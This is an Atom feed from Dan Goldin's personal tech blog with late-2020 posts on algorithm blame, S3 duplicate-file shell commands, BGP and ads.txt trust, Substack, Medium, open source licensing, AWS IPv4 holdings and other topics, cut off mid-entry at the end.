<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" >
 <title>Dan Goldin</title>
 <link href="http://dangoldin.com/atom.xml" rel="self"/>
 <link href="http://dangoldin.com/"/>
 <updated>2020-12-19T23:08:03-05:00</updated>
 <id>http://dangoldin.com/</id>
 <author>
   <name>Dan Goldin</name>
   <email>dangoldin@gmail.com</email>
 </author>

 
 <entry>
   <title>Blame the algorithm</title>
   <link href="http://dangoldin.com/2020/12/19/blame-the-algorithm/"/>
   <updated>2020-12-19T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/12/19/blame-the-algorithm</id>
   <content:encoded><![CDATA[
<p>Stanford Medicine is in the <a href="https://www.npr.org/sections/coronavirus-live-updates/2020/12/18/948176807/stanford-apologizes-after-vaccine-allocation-leaves-out-nearly-all-medical-resid">news</a> for using an “algorithm” and allocating minimal COVID vaccines to those actually on the frontlines. Instead it supposedly prioritized senior administrators who are working from home. I’m sure there’s some truth to the algorithm biasing allocation to those who are older but whenever I see someone blame an algorithm my spidey-sense goes off. The algorithm in this case was likely some extremely simple calculation in Excel that could have been easily verified by a human - both before it was run as well as a quick analysis of the results.</p>

<p>When writing software we write unit tests to test the functionality of our code and that could have easily been applied here. Similarly, when we deploy code we ask what do we expect to see and then confirm the results. This didn’t happen here and it required residents actually raising the issue to the administration.</p>

<p>The cynical view is that this was intentionally done by the administration to prioritize the vaccines for themselves. If no one complained they’d get the vaccine. If there were complaints they’d just blame the algorithm. I wouldn’t be surprised if that’s what happened here. In any case, as the entire world moves to software we really need to stop blaming the algorithm and instead blame the authors and approvers.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Removing duplicate files in S3</title>
   <link href="http://dangoldin.com/2020/12/18/removing-duplicate-files-in-s3/"/>
   <updated>2020-12-18T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/12/18/removing-duplicate-files-in-s3</id>
   <content:encoded><![CDATA[
<p>I’m a digital hoarder and whenever I had to switch computers, I was always worried about losing files. These days it’s both lower risk since so much is scattered across the cloud but with the ascent of AWS I’ve resorted to just backing up my computers onto S3.</p>

<p>I simply do a recursive copy of my home folder to S3 and call it a day. One problem this exposes is that there are duplicate files scattered all over the place. For example I’d have something both in my Downloads folder as well as in a Photos and maybe even a Dropbox folder. Or I would just have the same file duplicated in the same directory. At the end of the day it’s not a huge deal but at the same time it feels dirty so I started working on a script to identify these duplicates.</p>

<p>At this point calling it a script is a bit of an overstatement since it’s just a series of shell commands that act as a proof of concept. The end goal is to write a script that will accept a set of destinations to analyze, download the potentially similar files, and give users the interactive ability to choose which of the file(s) to keep.</p>

<p>In any case, one can get pretty far simply using the following shell commands to get the list of files from S3 and then manipulate them to identify the potential duplicates. At that point the filename likely gives aways the obvious duplicates and the rest you can download and compare.</p>

<p>Next step is to roll this into an actual script that can take multiple directories, run through the steps at once, and then add that interactive way to fetch, display, and delete the files.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Dump the filenames, dates, and sizes to a text file.</span>
~ aws s3 <span class="nb">ls </span>s3://bucket_path/key_path <span class="nt">--profile</span><span class="o">=</span>xyz <span class="nt">--recursive</span> <span class="o">&gt;</span> s3_files.txt

<span class="c"># Sort these so we can then count duplicates</span>
~ <span class="nb">sort </span>s3_files.txt <span class="nt">-k3</span> <span class="nt">-n</span> | <span class="nb">tr</span> <span class="nt">-s</span> <span class="s1">' '</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f3-10</span> <span class="o">&gt;</span> sorted_s3_files.txt

<span class="c"># Extract all the duplicated files</span>
<span class="nb">cat </span>sorted_s3_files.txt | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span> | <span class="nb">uniq</span> <span class="nt">-d</span> <span class="o">&gt;</span> sorted_s3_files_potential_dups.txt

<span class="c"># Sort both original and duplicate files as text so we can then use the join command</span>
<span class="nb">sort </span>sorted_s3_files.txt <span class="o">&gt;</span> sorted_s3_files_str.txt
<span class="nb">sort </span>sorted_s3_files_potential_dups.txt <span class="o">&gt;</span> sorted_s3_files_potential_dups_str.txt

<span class="c"># Inner join the full set and the duplicates to get the file names of the potential duplicates</span>
<span class="nb">join </span>sorted_s3_files_potential_dups_str.txt sorted_s3_files_str.txt | <span class="nb">sort</span> <span class="nt">-n</span> <span class="o">&gt;</span> sorted_s3_files_potential_dups_full_info.txt</code></pre></figure>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>What do adtech and BGP have in common?</title>
   <link href="http://dangoldin.com/2020/12/17/what-do-adtech-and-bgp-have-in-common/"/>
   <updated>2020-12-17T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/12/17/what-do-adtech-and-bgp-have-in-common</id>
   <content:encoded><![CDATA[
<p>Despite writing web applications many engineers are not familiar with the infrastructure side of the internet - <a href="https://www.cloudflare.com/learning/dns/what-is-dns/">DNS</a>, <a href="https://www.cloudflare.com/learning/security/glossary/what-is-bgp/">BGP</a>, TCP/IP - and yet depend on it all working. Over the years I’ve gotten a better understanding of the guts of the internet but only in the past few weeks have I discovered <a href="https://en.wikipedia.org/wiki/Resource_Public_Key_Infrastructure">Resource Public Key Infrastructure</a> (RPKI) on top of BGP. RPKI is meant to add a layer of trust on top of the existing infrastructure which was designed many decades ago without worrying about malicious actors.</p>

<p>A simple way to view it is to imagine various entities broadcasting routes between IP addresses. So long as everyone is honest the system works and traffic is routed in near-optimal ways. But a malicious actor can broadcast incorrect routes which can then be naively followed. RPKI simply adds authority/trust to these broadcasts so routes cannot simply be hijacked.</p>

<p>This mirrors recent trends in adtech that aim to improve transparency and honesty - for example <a href="https://iabtechlab.com/sellers-json/">sellers.json</a> and <a href="https://iabtechlab.com/ads-txt/">ads.txt</a>. Similar to RPKI they give the various players in the adtech ecosystem information around the legitimacy of what they’re buying or selling. For example, a website will maintain an ads.txt file (<a href="https://www.nytimes.com/ads.txt">NY Times</a> example) that lists legitimate sellers of their ad inventory and the way those ads are represented in the market. Similarly, an ad exchange will host a sellers.json file (<a href="https://cdn.3lift.com/sellers.json">TripleLift</a> example) that contains the set of publishers that they represent. A buyer can reference both of these to confirm that the ad request they are seeing is legitimate.</p>

<p>Both BGP and adtech suffer from system that were built around trust so it shouldn’t be surprising that they came up with similar solutions but it’s yet another reminder of how connected the modern internet is.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Substack can evolve into a marketplace</title>
   <link href="http://dangoldin.com/2020/12/15/substack-can-evolve-into-a-marketplace/"/>
   <updated>2020-12-15T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/12/15/substack-can-evolve-into-a-marketplace</id>
   <content:encoded><![CDATA[
<p>When I first heard of Substack I wasn’t too impressed. I fell into the usual engineering trick of thinking it’s something that could be “built in a weekend” but there’s a lot going on behind the scenes. Last week I listened to an <a href="https://www.theverge.com/22159571/substack-ceo-chris-best-interview-newsletter-subscription-model-journalism-decoder-podcast">interview with Substack’s CEO</a>, Chris Best, which made me realize the scale and scope of Substack’s ambitions.</p>

<p>At the most fundamental level it’s a product that allows writers to publish a newsletter - taking care of all the mechanics to let writers write. Yet I naively assumed this was just a text editor (think Medium), coupled with payments (Stripe), all hooked up to email (Sendgrid).</p>

<p>What I did not realize was that Substack also has a service, <a href="https://blog.substack.com/p/legal-support-for-substack-writers">Defender</a>, that provides legal services to its writers - in particular defending them against libel suits. And that’s just the start, the interview had a good discussion around Substack’s evolution and how it may end up offering, behaving, and operating like a large media company. That may mean that their economics will look more akin to a publisher than a tech company. Yet it may also mean that the services they offer will be higher touch than a typical platform.</p>

<p>The conversation had me thinking around what are the areas that Substack can get more efficient at scale? Legal protection may be one such area where many writers subsidize the few high-risk ones and yet similar to insurance this may lead to a bit of selection bias where the riskiest writers flee to Substack driving their legal costs up. Arguably any service can be done cheaper at scale since you’re able to leverage your size for better rates or volumes but typically quality suffers.</p>

<p>I wonder if they may end up with a marketplace model - a writer can sign up and have a barebones newsletter with no human touch. Yet if they want legal support they can pay extra and choose from a variety of lawyers. Or if they want an editor they can find a match on the editor marketplace. An illustrator? You can find one on the illustrator marketplace. A fact-checker? They have a marketplace for that too. All models carry some risk but this may be a way to get better economics while providing reasonably strong services.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Do your users delete or archive your email?</title>
   <link href="http://dangoldin.com/2020/12/14/do-your-users-delete-or-archive-your-email/"/>
   <updated>2020-12-14T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/12/14/do-your-users-delete-or-archive-your-email</id>
   <content:encoded><![CDATA[
<p>If you’ve been following this blog you likely know that I subscribe to the Inbox Zero approach to email management. I treat my inbox as a todo list and strive to get it down to zero with varying success. In any case, I spend a lot of time in my email and I noticed an odd pattern to how I deal with handled messages. Some I will delete while I others I’ll archive but it happens naturally. It’s not entirely subconscious but it’s a very quick decision I make as I run through my messages. The obvious rule is that anything I expect to search or reference later on I’ll archive while the truly useless emails I’ll simply delete.</p>

<p>If you’re building a product that relies on email it’s useful to consider your users’ purge behavior. Does your email have anything that will motivate users to keep it around? Or is it one-and-done? The latter isn’t necessarily bad since there are many emails that are transactional - imagine a promotion that a customer just doesn’t find valuable or a call for a donation - but it’s worth striving for something that has staying power. I’ve found that I’ll even treat newsletters differently - some I’ll keep while others I’ll read and delete.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Impact of getting to the top of Hacker News in 2020</title>
   <link href="http://dangoldin.com/2020/12/13/impact-of-getting-to-the-top-of-hacker-news-in-2020/"/>
   <updated>2020-12-13T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/12/13/impact-of-getting-to-the-top-of-hacker-news-in-2020</id>
   <content:encoded><![CDATA[
<p>Two days ago I wrote up a quick <a href="/2020/12/11/amazon-owns-more-than-2b-worth-of-ipv4-addresses/">post</a> highlighting how Amazon owns more than $2B domains and it struck a nerve. It’s been shared quite a bit on Twitter and I posted it to Hacker News on Friday night before going to bed to wake up to it being near the top which drove a ton of views. It’s always a surprise seeing what takes off but there’s something about Amazon owning billions of dollars in domains that’s shocking and gets people riled up. My goal is not to write in order to get my posts to go viral but it’s empowering knowing that thousands of people are reading something you’ve written.</p>

<img src="http://dangoldin.com/assets/static/images/blog-stats-2020.png" alt="Google Analytics showing nearly 9,500 page views" width="2762" height="1666" layout="responsive"/>

<p>The last time I wrote something this popular was in 2013 which led to <a href="/2013/04/19/what-does-getting-on-the-hn-front-page-get-you/">29,000 blog visits</a> across multiple days as well as coverage across other media sites. This post got me to almost 9,500 visits on a single day. It may be that Hacker News isn’t as popular as it used to be or more likely it’s become very difficult to stay at the top for long.</p>

<p>When I started blogging I used to be much more aggressive about promotion but these days I just enjoy the act of writing and editing. I’ve also been on a two post per week cadence which has been difficult to maintain and led to a decline in post length. I’m starting to think about how I’m going to change things up for 2021 but am leaning towards doing fewer, more in-depth posts while giving me the option to write quick posts if something comes to mind.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Evolution of open source licenses</title>
   <link href="http://dangoldin.com/2020/12/12/evolution-of-open-source-licenses/"/>
   <updated>2020-12-12T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/12/12/evolution-of-open-source-licenses</id>
   <content:encoded><![CDATA[
<p>Open source changed the way we write code. It’s given many of us a starting set of tools that allowed us to quickly put together new products and allowed us to specialize. These days open source is as strong as ever but there are a lot of changes happening on the licensing side. Under the older open source licenses, any company could take your code and then launch it as their own service. This wasn’t a problem in the past due to a highly fragmented market and trusting the developer to provide the gold-standard enterprise service but the rise of the cloud providers changed the dynamic. They have the scale to both build the expertise but also to lock-in customers.</p>

<p>This is not a great solution for those that have put years into open source and want to profit from it. Luckily there are a few approaches to push back against the cloud providers. One is simply to have multiple licenses - an open source one for either internal or community use and a separate paid one for an “enterprise” offering. There are also quite a few licenses, categorized as “copyleft” that propagate their license to any code that’s derived from that work. An even more recent license is the Business Source License (BSL) where the code starts off as being open-source for non-commercial use but then after a set period becomes truly open source.</p>

<p>I’m far from a lawyer and there’s significantly more nuance to the above but there is a trend to allow open source code authors to monetize their work. The problem they’re trying to solve is a real one but it’s difficult to predict what impact it will have on future contributions.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Amazon owns more than $2B worth of IPV4 addresses</title>
   <link href="http://dangoldin.com/2020/12/11/amazon-owns-more-than-2b-worth-of-ipv4-addresses/"/>
   <updated>2020-12-11T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/12/11/amazon-owns-more-than-2b-worth-of-ipv4-addresses</id>
   <content:encoded><![CDATA[
<p>While listening to a <a href="https://softwareengineeringdaily.com/2020/12/02/bgp-with-andree-toonk/">podcast discussing BGP</a> I heard the fact that AWS owns more than $2B worth of IP addresses. I knew AWS was massive but this came as a big shock so I decided to do some digging around. I came across a <a href="https://ipv4marketgroup.com/ipv4-pricing/">site</a> that listed the market prices of IP addresses and the range looks to be anywhere from $20 to $30 per IP depending on the block size. Now it was time to figure out the IP addresses owned by Amazon. I figured this would be difficult but lucky for us AWS actually <a href="https://ip-ranges.amazonaws.com/ip-ranges.json">publishes</a> their entire set of IP addresses as JSON.</p>

<p>The work is simply to download the JSON and then convert the CIDR blocks to the number of IPs and add them all up. As of today, December 11, 2020 AWS self reports owning 109,847,486 IPV4 addresses - at a price of $20 this is almost $2.2B and at $30 it’s almost $3.3B. That’s wild.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">urllib.request</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="k">with</span> <span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">urlopen</span><span class="p">(</span><span class="s">' https://ip-ranges.amazonaws.com/ip-ranges.json'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">j</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>

<span class="k">print</span><span class="p">(</span><span class="s">'All keys'</span><span class="p">,</span> <span class="n">j</span><span class="p">.</span><span class="n">keys</span><span class="p">())</span>

<span class="k">print</span><span class="p">(</span><span class="s">'IPV4 prefixes'</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">j</span><span class="p">[</span><span class="s">'prefixes'</span><span class="p">]))</span>

<span class="n">ips</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">prefix</span> <span class="ow">in</span> <span class="n">j</span><span class="p">[</span><span class="s">'prefixes'</span><span class="p">]:</span>
    <span class="n">cidr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">prefix</span><span class="p">[</span><span class="s">'ip_prefix'</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'/'</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
    <span class="n">ips</span> <span class="o">+=</span> <span class="mi">2</span><span class="o">**</span><span class="p">(</span><span class="mi">32</span><span class="o">-</span><span class="n">cidr</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">'# IPS'</span><span class="p">,</span> <span class="n">ips</span><span class="p">)</span></code></pre></figure>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Pay to enjoy video games</title>
   <link href="http://dangoldin.com/2020/12/08/pay-to-enjoy-video-games/"/>
   <updated>2020-12-08T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/12/08/pay-to-enjoy-video-games</id>
   <content:encoded><![CDATA[
<p>As a kid I was incredibly addicted to video games. I had a whole cat-and-mouse routine going on with my parents. They would put a BIOS boot password on the computer and I would open up the case, remove the battery, and reset the BIOS settings. They would lock the basement, where our one and only computer was located, and I would climb in through the window. They would lock the door to the computer room and I would undo the door hinges. It was difficult stopping me but remarkably I outgrew them and am now a somewhat well-adjusted member of society.</p>

<p>These days I don’t have much time nor interest in games and given the modern world of casual gaming I feel lucky. I acknowledge there’s a huge opportunity for game developers given how many smartphones are out there but every time I get nostalgic and download a game it ends up being “pay to enjoy” and after a bit of poking around I delete it in disgust.</p>

<p>A few days ago I was in the mood for a quick game and discovered “<a href="https://nobsgames.stavros.io/ios/">No-Bullshit Games</a>” - a site that avoids the pay-to-play games or those riddled with ads. I’m glad that this site exists yet it’s disappointing that it needs to exist. The ship has long sailed but I wish there was a return to the purer games.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Degrade functionality instead of building cross region availablity</title>
   <link href="http://dangoldin.com/2020/12/02/degrade-functionality-instead-of-building-cross-region-availablity/"/>
   <updated>2020-12-02T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/12/02/degrade-functionality-instead-of-building-cross-region-availablity</id>
   <content:encoded><![CDATA[
<p>AWS had a large multi-hour Kinesis <a href="https://aws.amazon.com/message/11201/">outage</a> last Wednesday that affected a variety of dependent services, including Cloudwatch, Lambda, ECS, and EKS. These systems are complicated and highlight the scale and complexity of modern cloud computing.</p>

<p>It’s impossible to be perfect but it’s a reminder for all of us to think through our applications and identify their failure cases. Just because there was a major AWS failure that affected your service does not mean you should drop everything and convert your application to be highly-available with regional failover. Instead try to model the probability of a particular failure, its impact, and the effort of a fix. With the above you should be able to identify some easy wins that get you fairly far.</p>

<p>The reality is that when it comes to availability you just want to be better than your customers. If your customers are down it’s unlikely they’ll even know you’re down. And in fact there’s strength in numbers - I recall a large <a href="https://aws.amazon.com/message/41926/">AWS S3 outage</a> in 2017 that took down a large chunk of the internet and at that point everyone was just waiting for AWS to recover. A big driver is your business - if you’re delivering a critical need then your SLAs and architecture should reflect it - Okta is a great example of <a href="https://www.okta.com/resources/whitepaper/how-okta-builds-and-runs-scalable-infrastructure/">architecting to reduce failure</a> - but many companies don’t need to go to such a degree.</p>

<p>One of the simpler actions to take is to design your application to run but in a degraded state. That may mean making it read-only for the duration of an issue or having all modifications waiting in a queue. A model we’ve had success with is using S3 as a sort of cache of business data that is used by our most critical applications. The data on S3 may not get refreshed if there’s an outage on any of the feeder systems but the application itself can operate just fine using slightly out of date data.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Static code analysis with DeepSource</title>
   <link href="http://dangoldin.com/2020/11/26/static-code-analysis-with-deepsource/"/>
   <updated>2020-11-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/11/26/static-code-analysis-with-deepsource</id>
   <content:encoded><![CDATA[
<p>While listening to the <a href="https://softwareengineeringdaily.com/">Software Engineering Daily</a> podcast I came across an <a href="https://softwareengineeringdaily.com/2020/11/09/deepsource-static-analysis-for-code-reviews-with-jai-pradeesh-and-sanket-saurav/">interview</a> with Jai Pradeesh and Sanket Saurav who are the founders of <a href="https://deepsource.io/">DeepSource</a>, a modern code analysis tool.</p>

<p>I’m a sucker for these types of tools and willing to try anything that’s low friction and promises to me more productive so I gave it a shot on two of my open source repos - <a href="https://github.com/dangoldin/health-stats/">health-stats</a> and <a href="https://github.com/dangoldin/blog-analytics/">blog-analytics</a>.</p>

<p>There have been quite a few of these tools - for example <a href="https://www.sonarqube.org/">SonarQube</a> and <a href="https://aws.amazon.com/codeguru/">Amazon’s CodeGuru</a> - but DeepSource definitely felt more modern. For one, it has a native integration to GitHub and I was able to get it added to the repos and start seeing results without having to write any code. In addition to the standard suggestions and recommendations DeepSource als has the ability to automatically open pull requests to address simple formatting and style issues.</p>

<p>I’m excited by the innovation in this space. Similar to the way IDEs have gotten smarter and smarter over time with their code completion and suggestions there’s a whole separate set of functionality that can be added through a GitHub integration. GitHub itself has been moving in this direction with <a href="https://github.com/dependabot">Dependabot</a> opening PRs to update libraries and we’ll likely see more and more here as the space evolves.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Bringing a user centric approach to the command line</title>
   <link href="http://dangoldin.com/2020/11/25/bringing-a-user-centric-approach-to-the-command-line/"/>
   <updated>2020-11-25T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/11/25/bringing-a-user-centric-approach-to-the-command-line</id>
   <content:encoded><![CDATA[
<p>I have a <a href="https://github.com/dangoldin/health-stats/blob/master/get_health.py">small script</a> that takes an export of Apple Health data and then dumps it into a MySQL database that I then use to visualize my health metrics over time. My prior workflow was to open the app and then Airdrop the file over to my computer at which point I’d unzip it, copy the relevant file over into the script directory, and simply run the script.</p>

<p>Clearly this was not the smoothest experience and I figured it was finally time to deal with it. I’ve seen scripts take a variety of inputs supporting all sorts of formats - for example a “-f” flag for a file or a “-d” for a directory - but I was never a fan of that. I want the script to take whatever is thrown at it and then just infer whatever the user intended. It’s not an approach you’d want in every use case but for a simple script I liked the elegance.</p>

<p>The implementation was simple enough - if it’s a zip file, handle it as a zip file; if it’s a directory, append export.xml and handle that as a file; otherwise assume it’s a standard file. I’m surprised most developers don’t adopt this approach - it’s bringing a more user-centric experience to the command line.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">if</span> <span class="n">fn</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">'.zip'</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Handling as zip file'</span><span class="p">)</span>
    <span class="k">with</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span> <span class="k">as</span> <span class="n">fz</span><span class="p">:</span>
        <span class="k">with</span> <span class="n">fz</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">'apple_health_export'</span><span class="p">,</span> <span class="s">'export.xml'</span><span class="p">))</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">xmldoc</span> <span class="o">=</span> <span class="n">minidom</span><span class="p">.</span><span class="n">parseString</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
<span class="k">elif</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isdir</span><span class="p">(</span><span class="n">fn</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Handling as directory'</span><span class="p">)</span>
    <span class="n">xmldoc</span> <span class="o">=</span> <span class="n">minidom</span><span class="p">.</span><span class="n">parse</span><span class="p">(</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="s">'export.xml'</span><span class="p">)</span> <span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Handling as export.xml file'</span><span class="p">)</span>
    <span class="n">xmldoc</span> <span class="o">=</span> <span class="n">minidom</span><span class="p">.</span><span class="n">parse</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span></code></pre></figure>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Subconciously learning to type Russian</title>
   <link href="http://dangoldin.com/2020/11/22/subconciously-learning-to-type-russian/"/>
   <updated>2020-11-22T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/11/22/subconciously-learning-to-type-russian</id>
   <content:encoded><![CDATA[
<p>I was born in the Soviet Union, came over as a 5 year old, and have seen my Russian getting worse and worse due to a lack of exposure. I’ve been using quarantine as a way to practice and improve my Russian through daily lessons in the Duolingo app. It’s a well designed app and while it has some flaws I’m on a 191 day streak and am loath to give it up. One thing that’s surprised me was how I’ve subconsciously picked up the Russian keyboard layout. I started having to hunt for each letter but these days have a subconscious feel for where the letters are. I actually do a better job typing without any thought than trying to figure out what letter comes next and where it is.</p>

<p>Maybe this is my early Russian immersion coming back. Or maybe it’s just the way we build habits. Or maybe it’s a bit of both. I just find this stark example of separation between the conscious and subconscious fascinating.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Cursed by GDPR</title>
   <link href="http://dangoldin.com/2020/11/20/cursed-by-gdpr/"/>
   <updated>2020-11-20T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/11/20/cursed-by-gdpr</id>
   <content:encoded><![CDATA[
<p>I had a fun little experience over the past few days. Someone had ordered Domino’s in the UK and seemingly typed in my email address by accident. This gave me the privilege of receiving daily emails from Domino’s promoting their latest deal. The first few days it was novel and interesting seeing what was popular across the pond but this morning I decided I might as well unsubscribe.</p>

<img src="http://dangoldin.com/assets/static/images/dominos-pre-vpn.png" alt="Domino's marketing page without VPN" width="1297" height="185" layout="responsive"/>

<p>Lo and behold the unsubscribe link didn’t work. Rather than a web page I got a friendly server error indicating “Access Denied” and that I did not have permission to access the unsubscribe page. My suspicion that this was a result of Domino’s blocking access to the site turned out to be true since I was able to unsubscribe using a VPN.</p>

<p>What a wild world. Rather than supporting a global unsubscribe Domino’s has a geofenced site for the UK that just blocks access outside the country (just try going to https://www.dominos.co.uk/ outside the UK). I don’t know what sort of anti-spam laws this violates (am I now <a href="https://www.ftc.gov/tips-advice/business-center/guidance/can-spam-act-compliance-guide-business">$43,280</a> richer?) but it’s ridiculous that I was not able to unsubscribe from Domino’s email without resorting to a VPN.</p>

<p>The lesson here is that if you live outside the Uk and want to bother someone - sign them up for an account on the Domino’s UK site.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Medium is a shopping mall </title>
   <link href="http://dangoldin.com/2020/11/14/medium-is-a-shopping-mall/"/>
   <updated>2020-11-14T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/11/14/medium-is-a-shopping-mall</id>
   <content:encoded><![CDATA[
<p>I empathize with Medium’s need to make money while avoiding ads but as an author it’s a bad deal. Medium has great editing and writing tools and a built in audience but if your goal is to share your articles with as broad of an audience as possible the fact that Medium throws up a paywall is a non-starter. Sure you can avoid it by going incognito but how many readers know that?</p>

<p>One way to think about Medium is as a shopping mall that decides to charge admission. Sure they drive foot traffic but every visitor you’re able to drive yourself is forced to pay the admission fee. A mall makes money by charging stores rent and stores pay the rent with the expectation that they’d be able to generate more sales due to the additional foot traffic. This is where the analogy with Medium breaks down - most (all?) writers don’t make any money on the traffic and won’t be willing to pay “rent” for pageviews. Maybe there’s a world where bloggers would pay for reach or additional functionality but it seems like a stretch.</p>

<p>The obvious model would have been Substack but despite its popularity and potential the total volume of articles written pales in comparison to Medium and it’s unclear how successful it’ll be. Medium tried and abandoned advertising yet the reality is that advertising was likely the right model here to encourage both creation and consumption. Couple that with the option to have both readers and writers pay to remove ads and you end up with the best of both worlds.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Poor Intel</title>
   <link href="http://dangoldin.com/2020/11/11/poor-intel/"/>
   <updated>2020-11-11T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2020/11/11/poor-intel</id>
   <content:encoded><![CDATA[
<p>Earlier this week Apple announced the new MacBook Air, featuring the Apple-built M1 chip, and heralding the return to their own chips. I wrote the <a href="/2008/04/25/on-apple-buying-pa-semiconductor/">first post</a> on this blog in 2008 covering Apple acquiring PA Semi and claimed that it made sense to design their own chips for phones but not PCs. Well it’s been 12 years and Apple has figured out how to make incredible chips for their phones so might as well expand to laptops as well.</p>

<p>You have to have some sympathy for Intel and AMD, but especially Intel. They’re being squeezed on the consumer side by the likes of Apple which is delivering substantial performance improvements and on the data center side with the major cloud providers rolling out <a href="https://venturebeat.com/2019/11/28/amazons-cloud-unit-has-designed-a-more-powerful-datacenter-chip/">their own chips</a>.</p>

<p>It used to be the case that chips were a commodity but now there’s value in being vertically integrated. The industry goes in cycles and I would not be surprised if in a decade we’re back to treating chips like a commodity.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Google and the Apple Watch</title>
   <link href="http://dangoldin.com/2020/10/27/google-and-the-apple-watch/"/>
   <updated>2020-10-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/10/27/google-and-the-apple-watch</id>
   <content:encoded><![CDATA[
<p>If you were to summarize my personal tech stack it would be Google software and Apple hardware. There are a few exceptions but those two companies likely cover the bulk of my technology usage. They’re great at what they do within their domains yet the intersection is lacking, especially on the Apple Watch. I suspect Apple is to blame for some of this but it doesn’t seem as if Google doesn’t even try to build for the Apple Watch.</p>

<p>For some unknown reason there’s no native Google Calendar app on the watch. The only way to see your events is to have them synced through the default Calendar app. I prefer the Google experience here - why not extend it to the watch? In fact, I had removed Apple’s native app entirely from my phone only to bring it back to have some calendar app on the watch.</p>

<p>Maps is another problem. This is likely due to Apple’s restrictions but the native maps app has a much nicer integration with the watch. You can turn the screen off and it will only turn on when it’s time to take an action. Similarly, it’ll vibrate ahead of a turn. Despite having the better algorithms and data the integrated experience pales compared to Apple.</p>

<p>I don’t have an Android watch but I suspect the integration with the Google ecosystem is smoother and yet Google has adopted the strategy of increasing their reach on all devices. There’s a big opportunity here for Google and I’ll keep waiting.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Substack and paid newsletters</title>
   <link href="http://dangoldin.com/2020/10/21/substack-and-paid-newsletters/"/>
   <updated>2020-10-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/10/21/substack-and-paid-newsletters</id>
   <content:encoded><![CDATA[
